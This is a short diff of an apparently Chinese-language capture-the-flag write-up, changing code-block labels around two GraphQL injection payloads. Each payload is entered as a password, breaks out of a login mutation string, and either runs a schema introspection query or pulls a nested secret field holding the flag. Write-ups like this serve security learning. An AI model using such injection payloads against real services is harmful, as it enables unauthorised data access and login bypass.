@@ -538,7 +538,7 @@ pass"){login:login(username:$username,password:$password){ok isAdmin:ok username
 
 再构建一个密码进行查询
 
-```graphsql
+```sql
 pass"){login:__schema{ok:queryType{name}isAdmin:mutationType{name}username:types{name fields(includeDeprecated:true){name type{name}}}}alias:#
 ```
 
@@ -546,7 +546,7 @@ pass"){login:__schema{ok:queryType{name}isAdmin:mutationType{name}username:types
 
 然后再构建一个密码查询flag
 
-```graphsql
+```sql
 pass"){login:secret{ok:__typename isAdmin:__typename username:secret_lR5H{secret_NVId{secret_F5Ge{secret_BbgJ{secret_4u35{secret_U5Qe{secret_0zhc{flag2}}}}}}}}alias:#
 ```
 
